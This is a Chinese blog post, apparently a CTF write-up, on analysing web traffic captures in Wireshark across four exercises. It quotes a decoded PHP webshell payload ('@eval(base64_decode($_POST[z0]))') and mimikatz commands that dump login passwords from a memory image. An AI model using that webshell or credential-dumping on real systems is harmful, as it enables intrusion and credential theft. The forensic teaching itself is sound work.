
--- 
title:  常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流） 
tags: []
categories: [] 

---
### web流量分析基本套路
1. 流量分析传输了数据：zip rar png jpg txt mp3，特别是流量包比较大时需要注意1. binwalk分离文件，grep或者wireshark内ctrl+f搜索1. 分情况使用导出对象，导出分组字节流，原始数据1. 搜索时可以看情况搜索分组详情、分组字节流1. 查看包间的差异，可以按大小排列数据包等1. png在流量中经常以base64形式出现1. 如果有TLS，要么找密钥，要么看别的协议
#### 例题一普通http流量

使用wireshark打开文件

可以点击Protocol，按协议进行排序

也可以直接按请求方式过滤

```
http.request.method == "GET"  
http.request.method == "POST"

```

发现大部分请求都是404，有三个成功，并且是编码数据

<img src="https://img-blog.csdnimg.cn/img_convert/0be65d744778bdd650d545a71ab9ada2.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_http">

点击右击选择追踪流-&gt;http流

<img src="https://img-blog.csdnimg.cn/img_convert/3b17a277ce7191ed77fc9ed526d644c4.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_数据_02">

进行base64解码

第二个是flag.txt

<img src="https://img-blog.csdnimg.cn/img_convert/f905dc2b4583f58003b82fc882e84e6d.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_http_03">

找到流量右击选择导出分组字节流

因为url访问的是

```
print\_r(gzcompress(file\_get\_contents(base64\_decode(%22ZmxhZy50eHQ%22))));

```

需要解码

```
gzcompress  
相反的函数就是  
gzuncompress

```

decode.php

```
&lt;?php  
$file=file\_get\_contents("./flag.bin");  
$file=gzuncompress($file);  
var\_dump($file);  
?&gt;

```

<img src="https://img-blog.csdnimg.cn/img_convert/88cf9e285c4c02ee0e4cbd55162a57ae.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_php_04">

得到flag

#### 例题二http传输文件流量

<img src="https://img-blog.csdnimg.cn/img_convert/c1b6e5ad6db8ad204002da895618d972.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_数据_05">

文件比较大

使用wireshark打开，按协议排序

<img src="https://img-blog.csdnimg.cn/img_convert/8019d104ea0f7afc6e074f9e9118d95d.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_数据_06">

追踪TCP流

<img src="https://img-blog.csdnimg.cn/img_convert/09dcc8eaad7ddb8157dad50df1bbbf25.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_http_07">

发现可疑代码，解码整理一下

```
yo=@eval（base64\_decode($\_POST\[z0\]));  
&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==

```

```
@ini\_set("display\_errors","0");@set\_time\_limit(0);@set\_magic\_quotes\_runtime(0);echo("-&gt;|");;$D=dirname($\_SERVER\["SCRIPT\_FILENAME"\]);if($D=="")$D=dirname($\_SERVER\["PATH\_TRANSLATED"\]);$R="{$D}\\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is\_dir("{$L}:"))$R.="{$L}:";}$R.="\\t";$u=(function\_exists('posix\_getegid'))?@posix\_getpwuid(@posix\_geteuid()):'';$usr=($u)?$u\['name'\]:@get\_current\_user();$R.=php\_uname();$R.="({$usr})";print $R;;echo("|&lt;-");die();

```

其他HTTP流量中也没有什么重要信息，选择追踪TCP流，在流21，发现rar文件，选择原始数据，另存为

<img src="https://img-blog.csdnimg.cn/img_convert/12bae17fc7ff1adc6b6109590c6f5a8d.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_数据_08">

这是把整个数据包都保存下来了，在本地打开rar文件，如果打不开文件，使用010打开，把无用内容删除

<img src="https://img-blog.csdnimg.cn/img_convert/0168dd4ae689f971254e2f2a3c072070.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_php_09">

打开rar压缩包发现被加密了，因为这是到流量题，有限考虑去流量中找密码，其次是考虑压缩包的各种考点

这个压缩包肯定是传过来之前被加密的，所以需要向前找，看看流量中有什么

在的流量中可以看到传了三个变量，z0，z1，z2，其中z2解码之后就是每次执行的命令，从流21开始依次向前解码z2，发现流18，base64解码内容为

```
cd /d "c:\\inetpub\\wwwroot\\"&amp;C:\\progra~1\\WinRAR\\rar a C:\\Inetpub\\wwwroot\\backup\\wwwroot.rar C:\\Inetpub\\wwwroot\\backup\\1.gif -hpJJBoom&amp;echo \[S\]&amp;cd&amp;echo \[E\]

```

大概就是在cmd中调用了winrar，加密文件并设置密码

```
hp\[password\] 加密文件数据和文件头

```

密码就是JJBoom了，解压文件

<img src="https://img-blog.csdnimg.cn/img_convert/bfb0f254f68665861249ae5c45de7cc7.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_http_10">

但是图片并不能查看，用010打开

<img src="https://img-blog.csdnimg.cn/img_convert/07af98f308281f31fc801ceb11a47c54.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_https_11">

文件头是MDMP，说明这是Dump文件或用linux下的file命令查看文件格式

>  
 Dump文件是进程的内存镜像，可以把程序的执行状态通过调试器保存到dump文件中。Dump文件是用来给驱动程序编写人员调试驱动程序用的，这种文件必须用专用工具软件打开，比如使用WinDbg打开 


需要使用猕猴桃mimikatz打开

使用以下三条命令

```
log d:\\1.txt  //将回显输出到一个文件中  
sekurlsa::minidump 1.gif  //载入dmp文件  
sekurlsa::logonpasswords full //读取登录密码

```

登录密码就是flag

<img src="https://img-blog.csdnimg.cn/img_convert/b7fb2ccda1f40c0b86af05643bdb72ce.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_文件指针_12">

总结：
1. 如果数据包比较大，可以追踪流再保存，数据包小的话可以直接使用保存分组字节流1. 数据流量比较多的话，在wireshark中可以使用统计-&gt;conversations进行查看
#### 例题三https加密流量

一个pcap文件一个txt文档

txt文档内容为题目的提示

```
提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c  
提示二：注意补齐私钥格式  
\-----BEGIN RSA PRIVATE KEY-----  
XXXXXXX  
\-----END RSA PRIVATE KEY-----

```

打开流量包没有发现http，但是存在TLS协议，判断采用了https，需要密钥解码

<img src="https://img-blog.csdnimg.cn/img_convert/c42abea9040eb8d190efe43dc47706a1.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_数据_13">

继续分析其他协议，翻一遍smtp，发现一张经过base64图片

<img src="https://img-blog.csdnimg.cn/img_convert/8bba3733cbd0a5913fc1679d247e864d.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_https_14">

选择show data as 原始数据，另存为1.txt，把多余的信息删除，只保留base64

使用脚本将base64转换成图片

```
import base64  
f=open("data.txt","r")  
f2=open("1.png","wb")  
content=base64.b64decode(f.read())  
f2.write(content)  
f.close()      
f2.close()

```

<img src="https://img-blog.csdnimg.cn/img_convert/f4e2b86172d77364f3f6d54736d4d40b.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_数据_15">

生成的图片，可以联想到HTTPS的私钥，使用ocr进行识别，我用的是qq识屏，识别后点击下载，保存数据，python简单处理下除掉多余的空格

因为题目提示了中间容易出错的地方大概就是这里了，对一下md5值不对，头大了，需要一个个的对比

将字符前后加上RSA的标记，保存文档

<img src="https://img-blog.csdnimg.cn/img_convert/96aa3de84481ca2add10d99189f706aa.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_php_16">

在wireshark中添加私钥文件
1. 编辑-&gt;首选项-&gt;选择协议TLS-&gt;选择RSA keys list-&gt;点击Edit1. 在弹出的窗口中点击左下角加号-&gt;在Key File中选择文件-&gt;点击ok
添加完成，wireshark会自动刷新，搜索http协议，追踪流就可以看到flag

#### 例题四视频流

两个点
1. 视频信息在流量包中使用UDP协议进行传输1. png，jpg等图片信息只要头尾标记在，图片外多余的数据不会影响显示
打开流量包，首先关注http协议，选中第一个http包右键选择追踪http流

<img src="https://img-blog.csdnimg.cn/img_convert/7fc4d88d502ae59100bb6df8e2972fc1.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_https_17">

在流中发现大量与视频相关的字眼，并且没有发现关于flag的信息，既然与视频相关就去看udp包

<img src="https://img-blog.csdnimg.cn/img_convert/34a4af451ec5dc288126ef23fd85c554.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_数据_18">

在流中发现jpg图片

```
jpg图片含有的明显特征

```

<img src="https://img-blog.csdnimg.cn/img_convert/31d460bf05505038c82bf64b6d36499f.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_http_19">

将这个流选择原始数据并保存，数据很多需要等待一会儿避免漏掉

因为整个流中有很多jpg图片所以需要使用脚本分割

```
f = open("./pcap","rb")  
data = f.read()  
sub = 0  
f.seek(0)  
while 1:  
    if f.read(3) == b'\\xff\\xd8\\xff':  
        f1 = open(str(sub) + '.jpg', "wb")  
        f1.write(data\[f.tell()-3:\])  
        f1.close()  
        sub += 1  
    else:  
        f.seek(-2, 1)

```

代码解释
- b’\xff\xd8\xff’ jpg格式文件头- f.seek() 函数用于将文件指针移动至指定位置
```
file.seek(offset\[, whence\])  
  
其中，各个参数的含义如下：  
file：表示文件对象；  
whence：作为可选参数，用于指定文件指针要放置的位置，该参数的参数值有 3 个选择：0 代表文件头（默认值）、1 代表当前位置、2 代表文件尾。  
offset：表示相对于 whence 位置文件指针的偏移量，正数表示向后偏移，负数表示向前偏移。例如，当whence == 0 &amp;&amp;offset == 3（即 seek(3,0) ），表示文件指针移动至距离文件开头处 3 个字符的位置；当whence == 1 &amp;&amp;offset == 5（即 seek(5,1) ），表示文件指针向后移动，移动至距离当前位置 5 个字符处。  
注意，当 offset 值非 0 时，Python 要求文件必须要以二进制格式打开，否则会抛出 io.UnsupportedOperation 错误。

```
- f.tell(3) 输出当前文件指针位置 tell实例
```
读取 a.txt 的代码如下：  
f = open("a.txt",'r')  
print(f.tell())  
print(f.read(3))  
print(f.tell())  
运行结果为：  
0  
htt  
3

```

当使用 open() 函数打开文件时，文件指针的起始位置为 0，表示位于文件的开头处，当使用 read() 函数从文件中读取 3 个字符之后，文件指针同时向后移动了 3 个字符的位置。这就表明，当程序使用文件对象读写数据时，文件指针会自动向后移动：读写了多少个数据，文件指针就自动向后移动多少个位置

代码意思就是每次读取文件三个字节，判断是不是jpg的文件头，注意此时文件指针已经发生了变化向后移动了两位，如果是文件头就将当前指针位置到末尾的全部数据保存为jpg，也就是说生成的jpg图片大小会越来越小，如果不是jpg的文件头，文件指针就从当前位置向前移动两位继续判断

运行脚本解析图片

<img src="https://img-blog.csdnimg.cn/img_convert/ab96f988bfdb2d82c1b05e218c6d4f35.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_数据_20">

发现flag

<img src="https://img-blog.csdnimg.cn/img_convert/2355f1fc7caf43a32e17d00486c3ba99.png" alt="常规web流量分析总结及例题（普通http流量，http传输文件流量，https加密流量，视频流）_https_21">(https://gitee.com/q_one/oceanpic/raw/master/img2021-/20210912225231.png)]")
- **[](javascript:;)赞**- **[](javascript:;)收藏**- **[](javascript:;)评论**- **[](javascript:;)分享**- **[](javascript:;)举报**
上一篇：

下一篇：



提问和评论都可以，用心的回复会被更多人看到 **评论**

**发布评论**

**全部评论** () 最热 最新

**相关文章**
-  [ 单节点多集群流量转发方法 引言在实验环境（裸机）中部署多个 有雀CRC集群（CRC介绍请看 容器云平台本地集群UCCPS CRC介绍 ），导致集群间抢占宿主机80、443端口情况，本文用外部负载均衡方案解决端口冲突问题。 当然本方法也对裸机搭建的Kubernete的Ingress 或者gateway API 也有效。本方案适用于 根据域名转发流量的场景，但有一些小问题无法避免（后面会提到），因此比较适合测试场景。 ](https://blog.51cto.com/mahmut/9533532) nginx haproxy 有雀 CRC 代理 -  [ 跨集群流量调度实现 Kubernetes 集群金丝雀升级 有了多集群服务和跨集群的流量调度之后，使用 Kubernetes 的方式会发生很大的变化。流量的管理不再限制单一集群内，而是横向跨越了多个集群。最重要的是这一切“静悄悄地”发生，对应用来说毫无感知。 ](https://blog.51cto.com/u_16455808/9096513) 流量调度 跨集群 K8S -  [ 腾讯云取消免费10G CDN流量包：免费CDN时代结束 免费送了7-8年的腾讯云10G免费流量包，从2024年开始，停止赠送了!自此，国内绝大多数互联网大厂的CDN都开收费了! ](https://blog.51cto.com/lusongsong/9127938) 腾讯云 百度云 自媒体 -  [ 使用Fiddler进行HTTP流量分析 “Fiddler抓包工具使用。”Fiddler作为一个PC端的HTTP/HTTPS协议分析工具，能够抓取PC上的流量，并且它对HTTP类数据的分析，要比Wireshar… ](https://blog.51cto.com/protosec/3122596) 编程 -  [ Web流量分析工具 10 个强大的开源 Web 流量分析工具Web 流量分析工具多不胜数，从 WebTrends 这样专业而昂贵的，到 Google Analytics 这样强大而免费的，从需要在服务器端单独部署的，到可以从前端集成的，不一而足。本文收集并介绍了10个功能强大的开源 Web 流量分析工具，因为是开源的，因此可以免费部署到你的网站。TraceWatchTraceWatch 是一个开源 Web 流量分析程 ](https://blog.51cto.com/u_1243047/1635973) 流量 -  [ 流量分析 流量分析流量分析在HVV中的作用 在护网中蓝队其中一个重要的作用就是针对攻击的流量进行分析，一般是使用态势感知，全流量分析，防火墙等安全设备来捕获流量，并且对其进行流量分析，我们需要掌握流量特征和分 析的方法详细的流量如下Sql 报错Wireshark介绍 Wireshark（前称Ethereal）是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并尽可能显示出最为详细的网络封包资料。 ](https://blog.51cto.com/u_16468419/8956326) Wireshark 菜单栏 封包 -  [ 流量分析作用 1 网站流量的趋势能够预知网站的发展前景流量高的网站说明受用户的欢迎。而且，网站流量的变化直接反应网站发展的趋势，是前进，还是快速前进，还是下降，还是快速下降，或者处于平稳期。 2 网站流量分析可以反应用户黏度吸引了很多网站用户访问。但是，通过流量分析发现，用户停留的时间非常短，重复访问用户不多，用户平均浏览的页面也 ](https://blog.51cto.com/zeng2010/5294132) 曾祥展 流量分析作用 网络营销 访问量 搜索引擎 -  [ 浅谈流量图流入流出流量分析 见附件 ](https://blog.51cto.com/u_11403002/1941083) cacti     -  [ CTF流量分析常见题型(二)-USB流量 0x00 前言在学习Wireshark常见使用时，对常见CTF流量分析题型和铁人三项流量分析题的部分 ](https://blog.51cto.com/u_14449312/3867894) 流量分析 数据 sed 鼠标移动 键位 -  [ HTTP流量信息信息 微软终于放出了Windows Vista SP1 Beta限量测试版。Vista官方博客作者Brandon LeBlanc马上就在自己的几台PC上实际体验了一番。 　　　 安装Vista SP1 Beta最简单的方法莫过于通过Windows Update自动更新(以上升级也是如此)。下载大小会根据具体情况而不同。 　Le ](https://blog.51cto.com/u_116120/44210) 职场 HTTP 流量 休闲 -  [ Python使用HTTP代理进行网络流量分析 随着互联网的快速发展，网络流量分析变得愈发重要。为了更好地理解和监控网络流量，我们可以使用Python进行操作。而HTTP代理作为网络通信中的重要组件，能够帮助我们截取、查看和修改HTTP请求和响应。本文将探讨如何使用Python和HTTP代理进行网络流量分析。HTTP代理的工作原理是，当客户端发出HTTP请求时，该请求首先会经过代理服务器，然后由代理服务器转发给目标服务器。在请求返回时，代理服务 ](https://blog.51cto.com/u_15822686/9326761) HTTP 代理服务器 Python -  [ 网络流量分析 网络流量分析解决方案摘 要：网络流量分析是一个有助于网络管理者进行网络规划、网络优化、网络监控、流量趋势分析等工作的工具，通过对网络信息流（NetStream）的采集并分析可帮助网络管理者得到网络流量的准确信息，为网络的正常、稳定、可靠运行提供保障。随着网络的应用越来越广泛，规模也随之日渐增长，网络中承载的业务也越来越丰富。企业需要及时的了解到网络中承载的业务，及 ](https://blog.51cto.com/johnemoney/28417) 职场 流量分析 休闲 -  [ 网站流量分析资源 首推alexa.com不过现在alexa只提供ranking，无法知道确切的流量数据和page view 的数据。这个时候可以使用compete.com,虽然数据很有限，但是还是可以知道每天的独立ip访问量。最关键的相对alexa网站，compete.com没有中国网站的数据。另外一个是trafficestimate.com这个网站提供的信息相当完备，包括SEO, whois 和 ](https://blog.51cto.com/belmount/763303) 职场 休闲 SEO工具站点 -  [ Netstream 流量分析技术 本文参考华为手册 NetStream简介定义NetStream是一种对网络中的业务流量进行统计和分析的技术。目的随着因特网的高速发展，支持的业务和应用日益增多。导致网络和业务的部署和维护变得非常复杂，所以我们需要一种流量统计技术，以便对网络流量进行统计和分析，实现网络的细致管理和优化。传统的流量统计技术，由于其统计流量的方式不灵活并存在局限性（如表1所示），不能满足当前的业务需求。在这样 ](https://blog.51cto.com/jackor/2870293) netstream -  [ ingress 流量分析 流量分析工具 一、Windows wireShark主要是用来捕获网络数据包，并自动解析数据包，为用户显示数据包的详细信息，供用户对数据包进行分析。1、安装1）打开网址 http://www.wireshark.org，进入 Wireshark 官网 　　2）点击Download进入下载页面，选择合适的版本进行下载 　　3）双击下载的软件进行安装，可全部使用默认值，直至安装完成2、开始抓包　　单击wireSh ](https://blog.51cto.com/u_16213652/9792398) ingress 流量分析 Wireshark 层次结构 网络接口 -  [ java流量 java流量分析 流是什么？ 流是个抽象的概念，当程序需要从某个数据源读入数据的时候，就会开启一个数据流，数据源可以是文件、内存或网络等等。相反地，需要写出数据到某个数据源目的地的时候，也会开启一个数据流，这个数据源目的地也可以是文件、内存或网络等等。这个时候，你就可以想象数据好像在其中流动一样，如下图： 你可以将流想象成一个“水流管道”，水流就在这管道中形成了，自然就出现了方向的概念，水可以流进也可以流出。当 ](https://blog.51cto.com/u_16213607/8895558) java流量 Java IO InputStream OutputStream -  [ nginx流量分析 nginx切流量 一. 需求背景需要把旧的推荐服务逐步切换到新的推荐服务上，需要灰度切换，流量比例和灰度策略可以控制。 二. 方案当前数据请求流程是：外部请求—&gt;易车nginx —&gt;后端服务 ；经过跟运维沟通发现，目前易车nginx 是公司级别的 不允许某个业务对配置的修改，所以我们在易车nginx 和 后端服务之间添加了一个新的转发组件；已经跟运维沟通过该方案可行。 小流量数据请求流程为 ](https://blog.51cto.com/u_16099303/9795176) nginx流量分析 openresty lua nginx html -  [ 网站流量架构 网站流量分析系统 网站流量日志分析系统（一）概念网站流量日志分析系统：点击流数据模型 点击流:是指用户持续访问浏览网站的轨迹。 点击流数据是由散点状的点击日志数据梳理所得。点击流数据在数据建模时存在俩张模型表 Pageviews 和visits 1.首先有一张：原始访问日志表 时间戳/ip地址/请求的url/referal/响应码/。。。 2.页面点击流模型的 pageviews 表 session/ip地址/时间 ](https://blog.51cto.com/u_16099345/7351681) 网站流量架构 网站流量日志分析系统（一）概念 访问者 数据 数据采集 -  [ 简单流量分析 打开数据包发现存在大量的ICMP的请求包和响应数据包。 分析发现请求包和响应包的数据部分都存在着内容，内容是一串字符内容，尝试进行解密，但是失败。 发现包长度从90到1 而data段的长度从48到122 对应ascii码是0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRST … ](https://blog.51cto.com/u_15127682/3866433) 数据 ascii码 python 字符串 -  [ 实时流量数据分析 流量分析网站 在流量的来源分析中，常见的来源主要有三个，呈现可画图如下，当数据进入网站后又会经历首页、导航页和详细页的流动： &amp; ](https://blog.51cto.com/u_16099264/9072394) 实时流量数据分析 网站分析 搜索 数据 访问量 -  [ 容器内如何多端口 docker多个容器映射一个端口 大致描述我发现docker启动容器时（以redis为例），在已经启动了一个-p 6379:6379的redis1容器后，当我们开启第二个redis2容器时， 右边的端口映射既可以写别的我们想要映射的端口(-p 6380:6380 redis2)，也可以继续写6379(-p 6380:6379 redis2)！！！因为众所周知，一个服务只能占用一个端口，但是这里却能映射相同的docker容器的端口号 ](https://blog.51cto.com/u_16099289/9879058) 容器内如何多端口 docker centos redis 2d -  [ java中常用并发包 java并发包常用类juc 序言：JUC也就java.util.conCurrent的简称，基本上JAVA中涉及到多线程的类都是在这个包下的。 JUC包下的大多组件都是基于AQS基类的，今天我们简单聊一下JUC下的三大类CountDownLatch，CyclicBarrier，SemaphoreCountDownLatchCountDownLatch的中文意思就是倒计数器，通过构造函数来指定计时器的大小，下面通过一段代码来演 ](https://blog.51cto.com/u_16213600/9879460) java中常用并发包 多线程 java System 构造函数 -  [ java创建枚举对象写法 java新建枚举对象 在某些情况下，一个类的对象是有限而固定的。比如季节类，它只有4个属性。像这种实例有限且固定的类，被称为枚举类。没错，它仍然是一个类，具有类所有的特性。 下面就开始创建一个枚举类吧：** • 无法创建枚举文件的问题 ** new&gt;Enum 哎呀，结果发现创建的时候无法创建（如果你用的是eclipse），如下图： 这是因为Eclipse可以指定编译深度，默认值为1.4，而枚举是在jdk1. ](https://blog.51cto.com/u_16099229/9889225) java创建枚举对象写法 java android enum 枚举类 -  [Java防止重复提交拦截器 java如何防止重复提交 能解决一切的，目前应该还是离不开session。目标:1、当用户进行的是Refresh/Reload/Back/Forward操作、以及先Back再Submit操作时，仅仅是reloading先前的结果页。 2、当用户重复提交同一个任务操作时,后台服务接收并处理第一次提交的任务，后面提交不起作用（不转向也不提示）。](https://blog.51cto.com/u_16099247/9892681) Java防止重复提交拦截器 重复提交 struts 表单 -  [ java es 执行 script id java es配置 elasticsearch之Mac OS配置Java环境前言由于elasticsearch依赖Java，所以先要配置上Java环境，并且Java JDK必须要求1.8以上，这里以安装Java 1.8为例。安装环境如下：elasticsearch6.5.4Mac OS High Sierra 10.13kibana6.5.4下载打开官网，选择下载，勾选许可协议，选择Mac版本下载，如下图。在文件中找 ](https://blog.51cto.com/u_16099318/9892820) Java Mac JAVA 
## 学习资料分享

当然，**只给予计划不给予学习资料的行为无异于耍流氓**，### 如果你对网络安全入门感兴趣，那么你点击这里**👉**

**如果你对网络安全感兴趣，学习资源免费分享，保证100%免费！！！（嘿客入门教程）**

**👉网安（嘿客）全套学习视频👈**

我们在看视频学习的时候，不能光动眼动脑不动手，比较科学的学习方法是在理解之后运用它们，这时候练手项目就很适合了。

#### 

#### <img src="https://img-blog.csdnimg.cn/img_convert/d1c617b78ee48eda7601e5b803e69276.png" alt="img">

#### **👉网安（嘿客红蓝对抗）所有方向的学习路线****👈**

对于从来没有接触过网络安全的同学，我们帮你准备了详细的学习成长路线图。可以说是最科学最系统的学习路线，大家跟着这个大的方向学习准没问题。

#### <img src="https://img-blog.csdnimg.cn/img_convert/de55dfd737dae0cf88e416d0454b17a8.png" alt="img">

#### 学习资料工具包

压箱底的好资料，全面地介绍网络安全的基础理论，包括逆向、八层网络防御、汇编语言、白帽子web安全、密码学、网络安全协议等，将基础理论和主流工具的应用实践紧密结合，有利于读者理解各种主流工具背后的实现机制。

<img src="https://img-blog.csdnimg.cn/9609a53465cf4253b492a5185896fa71.png" alt="在这里插入图片描述">

**面试题资料**

独家渠道收集京东、360、天融信等公司测试题！进大厂指日可待！ <img src="https://img-blog.csdnimg.cn/f5f267c281c543fb9cc9af53b9003a37.png" alt="在这里插入图片描述">

#### **👉<strong><strong>嘿客必备开发工具**</strong>👈</strong>

工欲善其事必先利其器。学习**嘿**客常用的开发软件都在这里了，给大家节省了很多时间。

#### 这份完整版的网络安全（**嘿**客）全套学习资料已经上传至CSDN官方，朋友们如果需要点击下方链接**也可扫描下方微信二v码获取网络工程师全套资料**【保证100%免费】

#### <img src="https://img-blog.csdnimg.cn/img_convert/16c400294b6fda8f01400f24f1f12b0c.png" alt="在这里插入图片描述">

#### 如果你对网络安全入门感兴趣，那么你点击这里**👉**
